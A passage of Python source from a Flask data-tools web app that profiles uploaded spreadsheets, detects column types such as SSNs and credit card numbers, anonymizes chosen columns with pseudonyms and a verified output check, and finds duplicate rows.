        scores['IP Address'] = share(ipv4 | ipv6)
        formats['IP Address'] = 'IPv4' if ipv4.sum() >= ipv6.sum() else 'IPv6'
        scores['UUID'] = share(matches([r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'], case=False))
        scores['SSN'] = share(matches([r'\d{3}-\d{2}-\d{4}']))
        # A credit card number is 16 digits that also pass the Luhn checksum (a plain 16-digit id usually does not)
        card_shape = matches([r'\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}'])
        luhn_ok = str_data[card_shape].map(lambda v: _luhn_valid(re.sub(r'\D', '', v)))
        scores['Credit Card'] = float(luhn_ok.sum()) / n * 100
        scores['Phone Number'] = share(matches(_PHONE_PATTERNS))
        currency = matches(_CURRENCY_PATTERNS)
        scores['Currency'] = share(currency)
        if currency.any():
            first = str_data[currency].iloc[0]
            symbol = next((c for c in '$\u20ac\u00a3\u00a5' if c in first), None) or \
                next((code for code in ('USD', 'EUR', 'GBP', 'JPY', 'CAD', 'AUD') if code in first), None)
            if symbol:
                formats['Currency'] = f"Symbol: {symbol}"
        scores['Postal Code'] = share(matches(_POSTAL_PATTERNS))
        # Percentages are written with a % sign
        scores['Percentage'] = share(matches([r'\d+(?:\.\d+)?\s?%']))
        # IDs / serial numbers: PR-00001, INV123, 000123 ... but only when (nearly) every value is different
        id_share = share(matches([r'[A-Z]{2,}-?\d+', r'[A-Z]+\d+', r'\d+']))
        scores['ID/Serial'] = id_share if non_null_data.nunique() >= 0.9 * len(non_null_data) else min(id_share, 50.0)

    # A fraction between 0 and 1 is only called a percentage when the column's name says so (or it has % signs)
    if is_numeric and _PERCENT_NAME_HINT.search(str(col_name)):
        values = pd.to_numeric(sample_data, errors='coerce').dropna()
        if len(values) and values.between(0, 1).all():
            scores['Percentage'] = 100.0
    elif not is_numeric and scores.get('Percentage', 0) < 80 and _PERCENT_NAME_HINT.search(str(col_name)):
        fractions = pd.to_numeric(sample_data, errors='coerce')
        percent_signs = str_data.str.fullmatch(r'\d+(?:\.\d+)?\s?%', na=False)
        if (fractions.between(0, 1) | percent_signs).all():
            scores['Percentage'] = 100.0

    # Most specific first; a general type never beats a specific one just because its pattern is looser
    priority = ('Boolean', 'Date', 'Email', 'URL', 'IP Address', 'UUID', 'SSN', 'Credit Card', 'Phone Number',
                'Currency', 'Percentage', 'Postal Code', 'ID/Serial')
    threshold = 80.0
    for detected_type in priority:
        if scores.get(detected_type, 0) >= threshold:
            return {
                'detected_type': detected_type,
                'confidence': round(scores[detected_type], 1),
                'sample_values': [str(v) for v in sample_data.head(3).tolist()],
                'format_info': formats.get(detected_type),
            }

    # No strong match: a generic type from the column's own dtype
    pandas_type = str(col_data.dtype)
    if 'int' in pandas_type:
        detected_type = 'Integer'
    elif 'float' in pandas_type:
        detected_type = 'Float'
    elif 'bool' in pandas_type:
        detected_type = 'Boolean'
    elif 'datetime' in pandas_type:
        detected_type = 'Date'
    else:
        detected_type = 'Text'
    return {
        'detected_type': detected_type,
        'confidence': 100.0,  # 100% confidence for pandas-detected types
        'sample_values': sample_data.head(3).astype(str).tolist(),
        'format_info': None,
    }


def analyze_dataframe(df, progress_queue=None, session_id=None):
    """
    Comprehensive pandas-style data analysis.
    Returns a dictionary with all analysis results - NO data stored.
    """
    def send_progress(stage, current, total, message, percentage=None):
        """Send progress update to queue"""
        if progress_queue and session_id:
            if percentage is None and total > 0:
                percentage = int((current / total) * 100)
            elif percentage is None:
                percentage = 0
            progress_queue.put({
                'stage': stage,
                'current': current,
                'total': total,
                'percentage': percentage,
                'message': message
            })
    
    send_progress('loading', 0, 100, 'Reading file into memory...', 5)
    
    analysis = {
        'overview': {},
        'columns': {},
        'memory_info': {}
    }
    
    send_progress('overview', 0, 100, 'Analyzing dataset overview...', 10)
    
    # Overall dataset information
    analysis['overview'] = {
        'shape': {
            'rows': int(len(df)),
            'columns': int(len(df.columns))
        },
        'memory_usage_bytes': int(df.memory_usage(deep=True).sum()),
        'memory_usage_mb': round(df.memory_usage(deep=True).sum() / 1024 / 1024, 2),
        'dtypes_count': {str(k): int(v) for k, v in df.dtypes.value_counts().to_dict().items()},
        'duplicate_rows': int(df.duplicated().sum()),
        'has_duplicates': bool(df.duplicated().any())
    }
    
    send_progress('overview', 50, 100, 'Calculating memory usage...', 15)
    
    # Memory usage per column
    memory_usage = df.memory_usage(deep=True)
    analysis['memory_info'] = {
        'total_mb': round(memory_usage.sum() / 1024 / 1024, 2),
        'by_column': {
            col: {
                'bytes': int(memory_usage[col]),
                'mb': round(memory_usage[col] / 1024 / 1024, 3)
            }
            for col in df.columns
        }
    }
    
    send_progress('overview', 100, 100, f'Found {len(df.columns)} columns to analyze...', 20)
    
    # Per-column analysis
    total_columns = len(df.columns)
    for idx, col in enumerate(df.columns):
        # Progress: 20% (overview complete) to 90% (columns complete)
        # Distribute 70% across all columns
        column_progress = 20 + int((idx / total_columns) * 70) if total_columns > 0 else 20
        send_progress('columns', idx + 1, total_columns, f'Analyzing column {idx + 1}/{total_columns}: {col}...', column_progress)
        
        col_data = df[col]
        col_info = {
            'dtype': str(col_data.dtype),
            'non_null_count': int(col_data.notna().sum()),
            'null_count': int(col_data.isna().sum()),
            'null_percentage': round((col_data.isna().sum() / len(col_data)) * 100, 2),
            'unique_count': int(col_data.nunique()),
            'memory_bytes': int(memory_usage[col])
        }
        
        # Detect semantic type
        semantic_type_info = detect_semantic_type(col_data, col)
        col_info['detected_type'] = semantic_type_info['detected_type']
        col_info['type_confidence'] = semantic_type_info['confidence']
        col_info['type_samples'] = semantic_type_info['sample_values']
        col_info['format_info'] = semantic_type_info['format_info']
        
        # Numeric column statistics (booleans count as numeric to pandas but have no meaningful quartiles)
        if pd.api.types.is_numeric_dtype(col_data) and not pd.api.types.is_bool_dtype(col_data):
            col_info['is_numeric'] = True
            col_info['statistics'] = {
                'mean': float(col_data.mean()) if col_data.notna().any() else None,
                'median': float(col_data.median()) if col_data.notna().any() else None,
                'std': float(col_data.std()) if col_data.notna().any() else None,
                'min': float(col_data.min()) if col_data.notna().any() else None,
                'max': float(col_data.max()) if col_data.notna().any() else None,
                'q25': float(col_data.quantile(0.25)) if col_data.notna().any() else None,
                'q50': float(col_data.quantile(0.50)) if col_data.notna().any() else None,
                'q75': float(col_data.quantile(0.75)) if col_data.notna().any() else None,
                'skew': float(col_data.skew()) if col_data.notna().any() else None,
                'kurtosis': float(col_data.kurtosis()) if col_data.notna().any() else None
            }
            
            # Check for potential outliers using IQR method
            if col_data.notna().any():
                Q1 = col_data.quantile(0.25)
                Q3 = col_data.quantile(0.75)
                IQR = Q3 - Q1
                lower_bound = Q1 - 1.5 * IQR
                upper_bound = Q3 + 1.5 * IQR
                outliers = col_data[(col_data < lower_bound) | (col_data > upper_bound)]
                col_info['outliers'] = {
                    'count': int(outliers.count()),
                    'percentage': round((outliers.count() / len(col_data)) * 100, 2) if len(col_data) > 0 else 0
                }
        else:
            col_info['is_numeric'] = False
        
        # Categorical/string column analysis
        if pd.api.types.is_string_dtype(col_data) or pd.api.types.is_object_dtype(col_data) or isinstance(col_data.dtype, pd.CategoricalDtype):
            col_info['is_categorical'] = True
            # Most frequent values (top 10)
            value_counts = col_data.value_counts().head(10)
            col_info['top_values'] = {
                str(k): int(v) for k, v in value_counts.items()
            }
            
            # String length statistics if applicable
            try:
                str_lengths = col_data.dropna().astype(str).str.len()
                if len(str_lengths) > 0:
                    col_info['string_stats'] = {
                        'mean_length': float(str_lengths.mean()),
                        'min_length': int(str_lengths.min()),
                        'max_length': int(str_lengths.max()),
                        'median_length': float(str_lengths.median())
                    }
            except:
                pass
        
        # Date/time column analysis
        # Check both pandas datetime dtype and semantic type detection
        is_date_dtype = pd.api.types.is_datetime64_any_dtype(col_data)
        is_date_detected = col_info.get('detected_type') == 'Date'
        
        if is_date_dtype or is_date_detected:
            col_info['is_datetime'] = True
            if col_data.notna().any():
                # If detected as date but stored as string, try to parse
                if is_date_detected and not is_date_dtype:
                    try:
                        parsed_dates = pd.to_datetime(col_data.dropna(), errors='coerce', infer_datetime_format=True)
                        valid_dates = parsed_dates.dropna()
                        if len(valid_dates) > 0:
                            col_info['date_range'] = {
                                'min': str(valid_dates.min()),
                                'max': str(valid_dates.max())
                            }
                    except:
                        pass
                else:
                    # Already datetime dtype
                    col_info['date_range'] = {
                        'min': str(col_data.min()),
                        'max': str(col_data.max())
                    }
        
        # Boolean column
        if pd.api.types.is_bool_dtype(col_data):
            col_info['is_boolean'] = True
            value_counts = col_data.value_counts()
            col_info['boolean_counts'] = {str(k): int(v) for k, v in value_counts.items()}
        
        analysis['columns'][col] = col_info
    
    send_progress('finalizing', 0, 100, 'Calculating type statistics...', 90)
    
    # Count columns by detected type
    detected_types_count = {}
    for col_name, col_info in analysis['columns'].items():
        detected_type = col_info.get('detected_type', 'Unknown')
        detected_types_count[detected_type] = detected_types_count.get(detected_type, 0) + 1
    
    analysis['overview']['detected_types_count'] = detected_types_count
    
    # Count how many columns were reclassified (detected type differs from pandas dtype)
    reclassified_count = 0
    for col_name, col_info in analysis['columns'].items():
        dtype = col_info.get('dtype', '')
        detected_type = col_info.get('detected_type', '')
        # Check if semantic detection found something different
        if 'object' in dtype or 'string' in dtype:
            if detected_type not in ['Text', 'Unknown']:
                reclassified_count += 1
    
    analysis['overview']['reclassified_columns'] = reclassified_count
    
    send_progress('finalizing', 100, 100, 'Finalizing analysis...', 95)
    
    return analysis

@job_worker('upload_path')
def analyze_file_async(upload_path, progress_queue, session_id):
    """Analyze file in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file into memory...', 5)
        
    # Read file into memory
    df = read_data_file(upload_path, mode='infer')
        
    send_progress('loading', 100, 100, f'File loaded: {len(df):,} rows, {len(df.columns)} columns', 10)
        
    # Analyze the dataframe
    analysis = analyze_dataframe(df, progress_queue, session_id)
        
    log.info('analysis complete: %d columns', len(analysis['columns']))

    # Clean up: explicitly delete dataframe and remove temp file
    del df
    os.remove(upload_path)

    # Keep the analysis for a while so a large one can be fetched separately (cleaned up after fetch or timeout)
    try:
        stored = make_json_serializable(analysis)
    except Exception:
        log.warning('analysis could not be made JSON-serializable up front; it will be converted on fetch')
        stored = analysis
    analysis_results[session_id] = {'data': stored, 'timestamp': time.time()}

    # Send the analysis in the final message unless it is large (or cannot be sized): then send a fetch URL
    try:
        too_large = len(json.dumps(analysis, default=str)) / (1024 * 1024) > 5
    except Exception:
        too_large = True
    final_message = {'stage': 'done', 'current': 100, 'total': 100, 'percentage': 100, 'message': 'Complete!'}
    if too_large:
        final_message.update({'analysis_fetch_url': f'/fetch-analysis/{session_id}', 'analysis_too_large': True})
    else:
        final_message['analysis'] = analysis
    progress_queue.put(final_message)


@app.route('/analyze', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def analyze_file():
    """Analyze uploaded file - returns session_id for progress tracking - NO data stored"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
        
    # Validate MIME type
    allowed_mimes = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',  # .xlsx
        'application/vnd.ms-excel',  # .xls
        'text/csv',  # .csv
        'application/csv'
    ]
    if hasattr(file, 'content_type') and file.content_type and file.content_type not in allowed_mimes:
        if file.content_type and not (file.content_type.startswith('text/') or file.content_type.startswith('application/')):
            return jsonify({'error': 'Invalid file type. Please upload an Excel or CSV file.'}), 400
        
    session_id, upload_path, filename = store_upload(file, 'analyze')
        
    progress_queue = open_job(session_id)
    start_job(analyze_file_async, upload_path, progress_queue, session_id)
        
    return job_started(session_id)
    
def generate_prefix(column_name):
    """Generate prefix from column name - simplifies column name and uses appropriate separator"""
    # Simplify column name by removing common suffixes
    simplified = column_name
    col_lower = simplified.lower()
    
    # Remove common suffixes (case-insensitive)
    suffixes_to_remove = ['_name', '_code', '_id', '_number', '_num', '_date', '_amount', '_value', '_account']
    
    for suffix in suffixes_to_remove:
        if col_lower.endswith(suffix):
            simplified = simplified[:-len(suffix)]
            col_lower = simplified.lower()
            break
    
    # Determine separator based on column name pattern
    # If column name contains spaces, use " - " separator (e.g., "Org Code - 1")
    # Otherwise use "_" separator (e.g., "Vendor_1")
    if ' ' in simplified:
        separator = ' - '
    else:
        separator = '_'
    
    return simplified + separator

def _scrub_key(value):
    """Identity of a cell value for pseudonym lookup. Values that read the same share a key (Excel 1, 1.0 and
    CSV '1'), but a boolean is not the number 1. Blank -> NaN."""
    return _comparable_text(value)


def scrub_dataframe(df, columns_to_scrub, relationship_preserve=False, progress_queue=None, session_id=None):
    """
    Anonymize selected columns while keeping the data's shape and referential integrity.

    Every non-blank cell of a selected column is replaced by a pseudonym; blanks stay blank. No code path ever
    returns an original value.

    relationship_preserve=True (with 2+ columns): each distinct COMBINATION of values across the selected
    columns gets one pseudonym, shared by all of those columns in the row. Otherwise each column is
    anonymized on its own (equal values share a pseudonym within the column).

    Returns (anonymized_df, mapping_records). A record is
    {"columns": [...], "original": [...], "pseudonym": "..."}: one per distinct value (independent mode) or per
    distinct combination (relationship mode); a blank part of a combination is null.
    """
    def send_progress(stage, current, total, message, percentage=None):
        if progress_queue and session_id:
            if percentage is None:
                percentage = int((current / total) * 100) if total > 0 else 0
            progress_queue.put({'stage': stage, 'current': current, 'total': total,
                                'percentage': percentage, 'message': message})

    send_progress('preparing', 0, 100, 'Preparing data for anonymization...', 5)

    valid_columns = [col for col in dict.fromkeys(columns_to_scrub) if col in df.columns]
    if not valid_columns:
        raise UserError("No valid columns selected for anonymization")
    send_progress('preparing', 50, 100, f'Found {len(valid_columns)} columns to anonymize...', 10)

    anonymized_df = df.copy()
    records = []

    def raw_value(value):
        return None if pd.isna(value) else (value if isinstance(value, (str, int, float, bool)) else str(value))

    if relationship_preserve and len(valid_columns) > 1:
        send_progress('anonymizing', 0, 100, 'Anonymizing with relationship preservation...', 15)
        keys = pd.concat([df[col].map(_scrub_key).rename(i) for i, col in enumerate(valid_columns)], axis=1)
        has_value = ~keys.isna().all(axis=1)          # a row blank in every selected column has nothing to hide
        combination = keys[has_value].groupby(list(keys.columns), dropna=False, sort=False).ngroup()
        prefix = generate_prefix(valid_columns[0])
        pseudonym_of_combination = {number: f"{prefix}{number + 1}" for number in combination.unique()}
        row_pseudonym = pd.Series(np.nan, index=df.index, dtype=object)
        row_pseudonym[has_value] = combination.map(pseudonym_of_combination)
        send_progress('anonymizing', 50, 100, f'Found {len(pseudonym_of_combination)} unique combinations...', 20)

        first_rows = combination.drop_duplicates()
        for row_label, number in first_rows.items():
            records.append({
                'columns': valid_columns,
                'original': [raw_value(df.at[row_label, col]) for col in valid_columns],
                'pseudonym': pseudonym_of_combination[number],
            })

        send_progress('applying', 0, 100, 'Applying anonymization to data...', 80)
        for i, col in enumerate(valid_columns):
            # the shared pseudonym where this cell has a value; blanks stay blank
            anonymized_df[col] = row_pseudonym.where(keys[i].notna(), np.nan)
        send_progress('applying', 100, 100, 'Relationship preservation complete...', 90)
    else:
        send_progress('anonymizing', 0, len(valid_columns), f'Anonymizing {len(valid_columns)} columns...', 15)
        for position, col in enumerate(valid_columns):
            send_progress('anonymizing', position, len(valid_columns), f'Anonymizing column: {col}...',
                          15 + int((position / len(valid_columns)) * 70))
            prefix = generate_prefix(col)
            keys = df[col].map(_scrub_key)
            first_rows = keys.dropna().drop_duplicates()            # order of first appearance
            pseudonym_of_key = {key: f"{prefix}{number}" for number, key in enumerate(first_rows, 1)}
            anonymized_df[col] = keys.map(pseudonym_of_key)         # NaN (blank) stays NaN
            for row_label, key in first_rows.items():
                records.append({'columns': [col], 'original': [raw_value(df.at[row_label, col])],
                                'pseudonym': pseudonym_of_key[key]})
        send_progress('anonymizing', len(valid_columns), len(valid_columns), 'Anonymization complete...', 85)

    send_progress('finalizing', 100, 100, 'Finalizing...', 95)
    return anonymized_df, records


def verify_anonymized(source_df, result_df, columns, records):
    """Raise unless every non-blank value in the scrubbed columns is a pseudonym and blanks are unchanged."""
    allowed = {col: set() for col in columns}
    for record in records:
        for col in record['columns']:
            allowed[col].add(record['pseudonym'])
    for col in columns:
        if col not in result_df.columns:
            raise UserError(f"Anonymization verification failed: column '{col}' is missing. Nothing was saved.")
        if int(result_df[col].isna().sum()) != int(source_df[col].isna().sum()):
            raise UserError(f"Anonymization verification failed: blank cells changed in column '{col}'. "
                             f"Nothing was saved.")
        not_replaced = int((~result_df[col].dropna().astype(str).isin(allowed[col])).sum())
        if not_replaced:
            raise UserError(f"Anonymization verification failed: {not_replaced} value(s) in column '{col}' are not "
                             f"anonymized. Nothing was saved.")


@job_worker('upload_path')
def scrub_file_async(upload_path, columns_to_scrub, relationship_preserve, export_mapping, progress_queue, session_id):
    """Scrub file in background thread with progress tracking"""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file into memory...', 5)
        
    # Read file into memory
    filename = os.path.basename(upload_path)
    df = read_data_file(upload_path)
        
    send_progress('loading', 100, 100, f'File loaded: {len(df):,} rows, {len(df.columns)} columns', 10)
        
    # Scrub the dataframe
    anonymized_df, mapping_records = scrub_dataframe(df, columns_to_scrub, relationship_preserve, progress_queue, session_id)
    scrubbed_columns = [col for col in dict.fromkeys(columns_to_scrub) if col in df.columns]
    log.info(f"Anonymization complete. Columns scrubbed: {len(scrubbed_columns)}")
        
    # Nothing is saved unless every value in the scrubbed columns is a pseudonym
    verify_anonymized(df, anonymized_df, scrubbed_columns, mapping_records)
        
    # Save anonymized file
    send_progress('saving', 0, 100, 'Saving anonymized data...', 90)
        
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"anonymized_{timestamp}"
        
    scrub_log = make_log('Data Anonymizer', len(df), len(anonymized_df),
                         {'columns': list(scrubbed_columns), 'relationship_preserved': bool(relationship_preserve),
                          'mapping_exported': bool(export_mapping)}, session_id)
    if filename.endswith('.csv'):
        output_path = job_output_path(session_id, f"{output_filename}.csv")
        sanitize_csv(anonymized_df).to_csv(output_path, index=False)
        download_url = job_download_url(session_id, f"{output_filename}.csv")
    else:
        output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        write_excel(anonymized_df, output_path, log=scrub_log)
        download_url = job_download_url(session_id, f"{output_filename}.xlsx")
        
    # Read the saved file back and check it too: what the user downloads is what must be anonymous
    try:
        verify_anonymized(df, read_data_file(output_path), scrubbed_columns, mapping_records)
    except Exception:
        os.remove(output_path)
        raise
    if output_path.endswith('.csv'):
        write_log_sidecar(output_path, scrub_log, session_id)      # only for a result that passed the check

    send_progress('saving', 50, 100, 'Anonymized data saved...', 95)
        
    # Save mapping key if requested: one record per distinct value (or combination), nothing is lost
    mapping_url = None
    if export_mapping and mapping_records:
        mapping_path = job_output_path(session_id, f"mapping_key_{timestamp}.json")
        with open(mapping_path, 'w') as f:
            json.dump({'relationship_preserved': bool(relationship_preserve and len(scrubbed_columns) > 1),
                       'mappings': mapping_records}, f, indent=2, default=str)
        mapping_url = job_download_url(session_id, f"mapping_key_{timestamp}.json")
        send_progress('saving', 100, 100, 'Mapping key saved...', 98)
    else:
        send_progress('saving', 100, 100, 'Complete...', 98)
        
    # Clean up: explicitly delete dataframes and remove temp file
    del df
    del anonymized_df
    os.remove(upload_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'mapping_url': mapping_url,
        'output_filename': os.path.basename(output_path)
    }
        
    progress_queue.put(final_message)
        
        
@app.route('/get-columns', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def get_columns():
    """Get column names from uploaded file for column selection"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
    with temporary_upload(file) as path:
        df = read_data_file(path, nrows=0)
    return jsonify({'success': True, 'columns': [{'name': str(col), 'dtype': str(df[col].dtype)} for col in df.columns]})


@app.route('/get-columns-with-samples', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def get_columns_with_samples():
    """Get column names with sample values from uploaded file"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
    with temporary_upload(file) as path:
        df = read_data_file(path, nrows=10)
    columns_info = [{
        'name': str(col),
        'dtype': str(df[col].dtype),
        'sample_values': [str(val) for val in df[col].dropna().head(10).tolist()],
    } for col in df.columns]
    return jsonify({'success': True, 'columns': columns_info})


# =============================================================================
# DATA PREVIEW & SESSION CACHE ENDPOINTS
# =============================================================================

@app.route('/preview-data', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def preview_data():
    """Get a preview of uploaded file data (first 20 rows)"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file (.xlsx, .xls, .csv)')
    with temporary_upload(file, 'preview') as path:
        preview = get_file_preview(path, max_rows=20)
    return jsonify({'success': True, 'filename': secure_filename(file.filename), **preview})


@app.route('/jobs/<job_id>/cancel', methods=['POST'])
def cancel_job(job_id):
    """Ask a running job to stop at its next progress report. Only the browser that started it may do so."""
    if job_registry.owner_of(job_id) != current_owner() or job_id not in progress_queues:
        return jsonify({'error': 'Job not found'}), 404
    cancelled_jobs.add(job_id)
    return jsonify({'success': True})


@app.route('/get-cached-files', methods=['GET'])
@api_errors
def get_cached_files_endpoint():
    """Get list of cached files from recent tool operations"""
    # Clean up old caches first
    cleanup_session_cache()

    # Format for frontend display with cache IDs
    files = []
    owner = current_owner()
    for cache_id, f in list(file_cache.items()):
        if f.get('owner') != owner:
            continue
        if os.path.exists(f.get('path', '')):
            # Format timestamp for display
            from datetime import datetime
            cached_at = datetime.fromtimestamp(f['timestamp']).strftime('%H:%M:%S')
            files.append({
                'cache_id': cache_id,
                'filename': f['name'],
                'rows': f['rows'],
                'cols': f['cols'],
                'timestamp': f['timestamp'],
                'cached_at': cached_at,
                'source_tool': f.get('source_tool', 'Unknown'),
                'age_seconds': int(time.time() - f['timestamp'])
            })

    # Sort by timestamp descending (most recent first)
    files.sort(key=lambda x: x['timestamp'], reverse=True)

    return jsonify({'success': True, 'files': files})

@app.route('/use-cached-file', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def use_cached_file():
    """Use a previously cached file result in a new tool operation"""
    data = request.get_json()
    cache_id = data.get('cache_id', '')

    if not cache_id:
        return jsonify({'error': 'No cache ID provided'}), 400

    file_info = get_cached_file_by_id(cache_id)
    if not file_info:
        return jsonify({'error': 'Cached file not found'}), 400

    if not os.path.exists(file_info.get('path', '')):
        return jsonify({'error': 'Cached file no longer exists'}), 400

    # Return file info for the frontend to use
    preview = get_file_preview(file_info['path'], max_rows=20)

    return jsonify({
        'success': True,
        'filename': file_info['name'],
        'preview': preview
    })

@app.route('/download-cached-file/<cache_id>', methods=['GET'])
@api_errors
def download_cached_file(cache_id):
    """Download a cached file by its cache ID"""
    file_info = get_cached_file_by_id(cache_id)
    if not file_info:
        return jsonify({'error': 'Cached file not found'}), 404

    file_path = file_info.get('path', '')
    if not os.path.exists(file_path):
        return jsonify({'error': 'Cached file no longer exists'}), 404

    return send_file(
        file_path,
        as_attachment=True,
        download_name=file_info['name']
    )

@app.route('/scrub-data', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def scrub_data():
    """Scrub uploaded file - returns session_id for progress tracking - NO data stored"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
        
    # Validate MIME type
    allowed_mimes = [
        'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',  # .xlsx
        'application/vnd.ms-excel',  # .xls
        'text/csv',  # .csv
        'application/csv'
    ]
    if hasattr(file, 'content_type') and file.content_type and file.content_type not in allowed_mimes:
        if file.content_type and not (file.content_type.startswith('text/') or file.content_type.startswith('application/')):
            return jsonify({'error': 'Invalid file type. Please upload an Excel or CSV file.'}), 400
        
    # Get columns to scrub and options
    columns_to_scrub = request.form.getlist('columns[]')
    if not columns_to_scrub:
        return jsonify({'error': 'No columns selected for anonymization'}), 400
        
    relationship_preserve = request.form.get('relationship_preserve', 'false').lower() == 'true'
    export_mapping = request.form.get('export_mapping', 'false').lower() == 'true'
        
    session_id, upload_path, filename = store_upload(file, 'scrub')
        
    progress_queue = open_job(session_id)
    start_job(scrub_file_async, upload_path, columns_to_scrub, relationship_preserve, export_mapping, progress_queue, session_id)
        
    return job_started(session_id)
    
@app.route('/duplicate-finder')
def duplicate_finder():
    return render_template('duplicate_finder.html')

@app.route('/unique-identifier-finder')
@app.route('/natural-key-finder')        # the name shown on the landing page
def unique_identifier_finder():
    return render_template('unique_identifier_finder.html')

@job_worker('upload_path')
def find_duplicates_async(upload_path, id_column, duplicate_columns, progress_queue, session_id, treat_blank_as_value=True):
    """Find rows that are identical in all selected columns, in a background thread with progress tracking.

    treat_blank_as_value=True: rows blank in the same selected columns count as duplicates of each other.
    False: a row with a blank in any selected column is never reported as a duplicate."""
    send_progress = progress_sender(progress_queue, session_id)
        
    send_progress('loading', 0, 100, 'Reading file into memory...', 5)
        
    # Read file into memory
    df = read_data_file(upload_path)
        
    send_progress('loading', 100, 100, f'File loaded: {len(df):,} rows, {len(df.columns)} columns', 10)
        
    # Validate ID column exists
    if not id_column or id_column not in df.columns:
        raise UserError(f"ID column '{id_column}' not found in file. Please select a valid ID column.")
        
    # Validate duplicate columns exist
    if not duplicate_columns:
        raise UserError("Please select at least one column to check for duplicates.")
        
    invalid_columns = [col for col in duplicate_columns if col not in df.columns]
    if invalid_columns:
        raise UserError(f"Columns not found in file: {', '.join(invalid_columns)}")
        
    # Ensure ID column is not in duplicate columns (we use it separately)
    duplicate_columns = [col for col in duplicate_columns if col != id_column]
        
    if not duplicate_columns:
        raise UserError("Please select at least one column (other than the ID column) to check for duplicates.")
        
    send_progress('analyzing', 0, 100, f'Comparing rows on {len(duplicate_columns)} selected column(s)...', 20)
        
    # Rows are duplicates when their VALUES are equal in every selected column (no joined-string signature,
    # so values that merely contain a separator can never be mistaken for each other).
    candidates = df if treat_blank_as_value else df[~df[duplicate_columns].isna().any(axis=1)]
    duplicated = candidates[candidates.duplicated(subset=duplicate_columns, keep=False)]
        
    send_progress('analyzing', 30, 100, 'Finding duplicate rows...', 40)
        
    group_numbers = duplicated.groupby(duplicate_columns, dropna=False, sort=False).ngroup()
    ids_by_group = duplicated[id_column].groupby(group_numbers, sort=False).agg(list)
    first_rows = duplicated.groupby(group_numbers, sort=False).head(1)
        
    send_progress('analyzing', 60, 100, f'Found {len(ids_by_group)} duplicate row groups...', 60)
        
    def shown(value):
        return '' if pd.isna(value) else value
        
    # Build results (groups in order of first appearance; ids in file order)
    results = []
    all_ids_to_remove = []
    sample_values = first_rows[duplicate_columns].to_numpy(dtype=object)
    for position, ids in enumerate(ids_by_group.tolist()):
        row_preview = ', '.join(f"{col}={shown(value)}" for col, value in zip(duplicate_columns, sample_values[position]))
        ids_to_remove = ids[1:]
        all_ids_to_remove.extend(ids_to_remove)
        results.append({
            'row_preview': row_preview,
            'count': len(ids),
            'ids': ids,
            'ids_to_remove': ids_to_remove,
            'keep_id': ids[0] if ids else None
        })
        
    send_progress('analyzing', 100, 100, f'Analysis complete: {len(results)} duplicate groups found', 70)
        
    # Create results DataFrame
    results_data = []
        
    for result in results:
        ids_str = ', '.join(str(shown(id_val)) for id_val in result['ids'])
        ids_to_remove_str = ', '.join(str(shown(id_val)) for id_val in result['ids_to_remove'])
            
        results_data.append({
            'Row Preview': result['row_preview'],
            'Count': result['count'],
            'Keep ID (Original)': result['keep_id'],
            'All IDs': ids_str,
            'IDs to Remove': ids_to_remove_str
        })
        
    results_df = pd.DataFrame(results_data)
        
    send_progress('saving', 0, 100, 'Saving results...', 80)
        
    # Save results to Excel
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    output_filename = f"duplicates_{timestamp}"
    output_path = job_output_path(session_id, f"{output_filename}.xlsx")
        
    output_path = write_sheets(output_path, [
        ('Duplicates', results_df),
        # IDs to remove: a single column for easy copy/paste
        ('IDs to Remove', pd.DataFrame({'ID': all_ids_to_remove}) if all_ids_to_remove else None),
    ], session_id, log=make_log('Duplicate Finder', len(df), len(results_df),
                                {'id_column': id_column, 'duplicate_columns': duplicate_columns,
                                 'treat_blank_as_value': treat_blank_as_value}, session_id))

    download_url = job_download_url(session_id, os.path.basename(output_path))
        
    send_progress('saving', 100, 100, 'Results saved...', 95)
        
    # Clean up
    del df
    del results_df
    os.remove(upload_path)
        
    # Send completion message
    final_message = {
        'stage': 'done',
        'current': 100,
        'total': 100,
        'percentage': 100,
        'message': 'Complete!',
        'download_url': download_url,
        'output_filename': os.path.basename(output_path),
        'results': results_data[:100],  # Send first 100 for preview
        'total_duplicates': len(results),
        'total_ids_to_remove': len(all_ids_to_remove),
        'treat_blank_as_value': bool(treat_blank_as_value)
    }
        
    progress_queue.put(final_message)
        
        
@app.route('/find-duplicates', methods=['POST'])
@rate_limit(max_requests=RATE_LIMIT_REQUESTS, window=RATE_LIMIT_WINDOW)
@api_errors
def find_duplicates():
    """Find duplicates in uploaded file - returns session_id for progress tracking"""
    file = check_upload('file', ('.xlsx', '.xls', '.csv'), 'Please upload an Excel or CSV file')
        
    # Get ID column selection (required)
    id_column = request.form.get('id_column', '').strip()
        
    if not id_column:
